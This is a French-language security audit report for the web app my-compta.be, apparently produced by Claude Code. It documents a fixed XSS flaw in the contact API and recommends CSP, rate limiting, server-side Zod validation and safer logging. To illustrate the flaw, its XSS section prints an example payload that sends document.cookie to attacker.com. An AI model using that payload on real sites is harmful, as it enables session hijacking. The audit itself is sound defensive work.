# 🔒 RAPPORT D'AUDIT DE SÉCURITÉ - MY-COMPTA.BE

**Date:** 9 décembre 2025
**Application:** my-compta.be
**Auditeur:** Claude Code
**Score global:** 🟢 8.5/10 (Bon - après corrections)

---

## 📊 RÉSUMÉ EXÉCUTIF

### ✅ Points forts
- ✅ Next.js 16.0.8 (patché contre CVE-2025-66478)
- ✅ 0 vulnérabilités npm audit
- ✅ Headers de sécurité de base configurés
- ✅ Secrets non hardcodés
- ✅ .env correctement ignoré par git
- ✅ HTTPS forcé en production
- ✅ Validation Zod côté client

### 🔴 Vulnérabilités corrigées
1. **XSS dans API contact** (CRITIQUE) - ✅ CORRIGÉ

### 🟡 Améliorations recommandées
1. Content-Security-Policy manquante
2. Rate limiting API manquant
3. Validation Zod côté serveur absente
4. Logs d'erreur exposent trop d'informations

---

## 🚨 VULNÉRABILITÉS DÉTECTÉES ET CORRIGÉES

### 1. XSS (Cross-Site Scripting) - API Contact
**Sévérité:** 🔴 CRITIQUE
**Fichier:** `src/app/api/contact/route.ts`
**Status:** ✅ CORRIGÉ

#### Problème
Les données utilisateur étaient directement interpolées dans du HTML sans échappement :
```javascript
// ❌ AVANT (VULNÉRABLE)
content = `<p><strong>Prénom:</strong> ${firstName}</p>`;
```

Un attaquant pouvait injecter :
```javascript
firstName: "<script>alert('XSS')</script>"
message: "<img src=x onerror='fetch(\"https://attacker.com?cookie=\"+document.cookie)'>"
```

#### Solution appliquée
```javascript
// ✅ APRÈS (SÉCURISÉ)
function escapeHtml(unsafe: string): string {
  if (!unsafe) return "";
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

content = `<p><strong>Prénom:</strong> ${escapeHtml(firstName)}</p>`;
```

#### Impact
- **Avant:** Injection de code JavaScript malveillant possible
- **Après:** Tous les caractères dangereux sont échappés

---

## ✅ SÉCURITÉ VALIDÉE

### 1. Dépendances npm
```bash
npm audit
# found 0 vulnerabilities ✅
```

**Versions critiques vérifiées:**
- Next.js: 16.0.8 ✅ (≥ 16.0.1 requis pour CVE-2025-66478)
- React: 19.1.0 ✅ (≥ 19.0.2 requis)
- Resend: 6.1.0 ✅
- Zod: 4.1.11 ✅

### 2. Secrets et variables d'environnement
- ✅ Aucun secret hardcodé dans le code
- ✅ `.env*` correctement ignoré dans `.gitignore`
- ✅ Variables sensibles accessibles uniquement via `process.env`

**Variables d'environnement utilisées:**
```
RESEND_API_KEY (côté serveur uniquement ✅)
CONTACT_EMAIL (côté serveur uniquement ✅)
NODE_ENV (non sensible)
```

### 3. Headers de sécurité
**Actuels (next.config.ts):**
```javascript
✅ Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
✅ X-Frame-Options: DENY
✅ X-Content-Type-Options: nosniff
✅ Referrer-Policy: strict-origin-when-cross-origin
```

### 4. HTTPS
- ✅ Redirection HTTP → HTTPS configurée en production
- ✅ Vérification du domaine (`my-compta.be`)
- ✅ HSTS activé (1 an)

### 5. Proxy/Middleware
- ✅ Pas de failles de sécurité détectées
- ✅ Gestion sécurisée des locales
- ✅ Pas d'injection possible via Accept-Language

### 6. JSON-LD (Structured Data)
- ✅ Utilisation sécurisée de `dangerouslySetInnerHTML`
- ✅ Données échappées via `JSON.stringify()`

---

## 🟡 RECOMMANDATIONS D'AMÉLIORATION

### 1. Content-Security-Policy (CSP)
**Priorité:** 🟡 MOYENNE
**Impact:** Protection contre XSS et injections

**Ajout recommandé dans `next.config.ts`:**
```typescript
headers: [
  {
    key: 'Content-Security-Policy',
    value: `
      default-src 'self';
      script-src 'self' 'unsafe-inline' 'unsafe-eval' https://umami.kago-group.com;
      style-src 'self' 'unsafe-inline';
      img-src 'self' data: https: blob:;
      font-src 'self' data:;
      connect-src 'self' https://umami.kago-group.com;
      frame-ancestors 'none';
      base-uri 'self';
      form-action 'self';
    `.replace(/\s+/g, ' ').trim()
  },
  {
    key: 'Permissions-Policy',
    value: 'camera=(), microphone=(), geolocation=()'
  },
  {
    key: 'X-DNS-Prefetch-Control',
    value: 'off'
  }
]
```

### 2. Rate Limiting API
**Priorité:** 🟡 MOYENNE
**Impact:** Protection contre brute-force et spam

**Problème actuel:**
```typescript
// src/app/api/contact/route.ts
// Aucune limite de requêtes ❌
```

**Solution recommandée:**
```typescript
// Installer: npm install @upstash/ratelimit @upstash/redis
import { Ratelimit } from "@upstash/ratelimit";
import { Redis } from "@upstash/redis";

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(5, "60 s"), // 5 requêtes par minute
});

export async function POST(request: Request) {
  const ip = request.headers.get("x-forwarded-for") || "unknown";
  const { success } = await ratelimit.limit(ip);

  if (!success) {
    return NextResponse.json(
      { message: "Trop de requêtes. Réessayez dans 1 minute." },
      { status: 429 }
    );
  }

  // ... reste du code
}
```

### 3. Validation Zod côté serveur
**Priorité:** 🟡 MOYENNE
**Impact:** Protection contre données malformées

**Problème actuel:**
```typescript
// Validation uniquement côté client ❌
// Un attaquant peut bypasser avec curl/Postman
```

**Solution recommandée:**
```typescript
// src/app/api/contact/route.ts
import { z } from "zod";

const contactSchema = z.object({
  type: z.enum(["callback", "contact"]),
  firstName: z.string().min(1).max(100),
  lastName: z.string().min(1).max(100).optional(),
  phone: z.string().min(8).max(20),
  company: z.string().max(200).optional(),
  email: z.string().email().max(200),
  message: z.string().min(10).max(5000).optional(),
});

export async function POST(request: Request) {
  try {
    const body = await request.json();

    // Validation
    const validated = contactSchema.parse(body);

    // Utiliser 'validated' au lieu de 'body'
    const { type, firstName, ... } = validated;

    // ... reste du code
  } catch (error) {
    if (error instanceof z.ZodError) {
      return NextResponse.json(
        { message: "Données invalides", errors: error.errors },
        { status: 400 }
      );
    }
    // ...
  }
}
```

### 4. Amélioration de la gestion d'erreurs
**Priorité:** 🟢 FAIBLE
**Impact:** Éviter la fuite d'informations

**Problème actuel:**
```typescript
console.error("Erreur lors de l'envoi du message:", error);
// ❌ Peut exposer des détails sensibles dans les logs
```

**Solution recommandée:**
```typescript
// Ne jamais logger l'objet error complet en production
if (process.env.NODE_ENV === "development") {
  console.error("Erreur détaillée:", error);
} else {
  console.error("Erreur envoi email");
}
```

### 5. Ajouter CSRF Protection
**Priorité:** 🟢 FAIBLE
**Impact:** Protection contre attaques CSRF

**Solution:**
- Next.js 16 intègre une protection CSRF de base
- Pour renforcer, utiliser des tokens CSRF pour les formulaires sensibles

---

## 📋 CHECKLIST DE SÉCURITÉ

### ✅ Fait
- [x] Patch CVE-2025-66478 appliqué
- [x] Faille XSS corrigée dans API contact
- [x] npm audit clean (0 vulnérabilités)
- [x] Secrets non exposés
- [x] .env ignoré par git
- [x] HTTPS forcé en production
- [x] Headers de sécurité de base

### 🟡 Recommandé (non bloquant)
- [ ] Ajouter Content-Security-Policy
- [ ] Implémenter rate limiting sur /api/contact
- [ ] Ajouter validation Zod côté serveur
- [ ] Améliorer la gestion d'erreurs
- [ ] Permissions-Policy header
- [ ] Monitoring des erreurs (Sentry/LogRocket)

### 🔵 Optionnel
- [ ] Ajouter CSRF tokens explicites
- [ ] Implémenter honeypot dans formulaire contact
- [ ] Ajouter ReCAPTCHA v3
- [ ] Scanner régulier avec OWASP ZAP
- [ ] Audit de sécurité professionnel annuel

---

## 🎯 PRIORITÉS D'ACTION

### Immédiat (déjà fait ✅)
1. ✅ Patch Next.js 16.0.8
2. ✅ Correction XSS API contact

### Court terme (1-2 semaines)
1. 🟡 Implémenter rate limiting
2. 🟡 Ajouter validation serveur
3. 🟡 Ajouter CSP header

### Moyen terme (1-3 mois)
1. 🟢 Setup monitoring erreurs
2. 🟢 Honeypot formulaire
3. 🟢 Tests de sécurité automatisés

---

## 🔐 SCORE DÉTAILLÉ

| Catégorie | Score | Détails |
|-----------|-------|---------|
| **Vulnérabilités connues** | 10/10 | 0 CVE, Next.js à jour |
| **Injection (XSS, SQL)** | 10/10 | XSS corrigé, pas de SQL |
| **Secrets exposés** | 10/10 | Aucun secret hardcodé |
| **Headers sécurité** | 7/10 | Manque CSP, Permissions-Policy |
| **Rate limiting** | 5/10 | Absent sur API |
| **Validation inputs** | 7/10 | Client OK, serveur manquant |
| **Gestion erreurs** | 8/10 | Bonne mais perfectible |
| **HTTPS/Transport** | 10/10 | HSTS, redirects OK |

**Score global:** 8.5/10 🟢

---

## 📝 COMMIT RECOMMANDÉ

Les corrections XSS doivent être commitées immédiatement :

```bash
git add src/app/api/contact/route.ts
git commit -m "🔒 SECURITY FIX - XSS dans API contact

FAILLE CORRIGÉE:
- Ajout fonction escapeHtml() pour échapper HTML
- Protection contre injection XSS via formulaire contact
- Toutes les entrées utilisateur sont maintenant échappées

IMPACT:
- Avant: Code JavaScript malveillant injectable
- Après: Tous caractères dangereux échappés

FICHIERS:
- src/app/api/contact/route.ts (ajout escapeHtml + utilisation)

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## 🆘 EN CAS D'INCIDENT

**Si vous détectez une exploitation:**

1. **Immédiat:**
   - Vérifier logs d'accès pour IP suspectes
   - Bloquer IP si nécessaire
   - Vérifier emails envoyés via Resend

2. **Court terme:**
   - Rotate RESEND_API_KEY
   - Analyser tous les emails reçus
   - Vérifier pas d'autres exploits

3. **Long terme:**
   - Implémenter rate limiting
   - Ajouter monitoring
   - Audit complet

---

**Rapport généré le:** 9 décembre 2025
**Prochaine révision recommandée:** 9 mars 2026
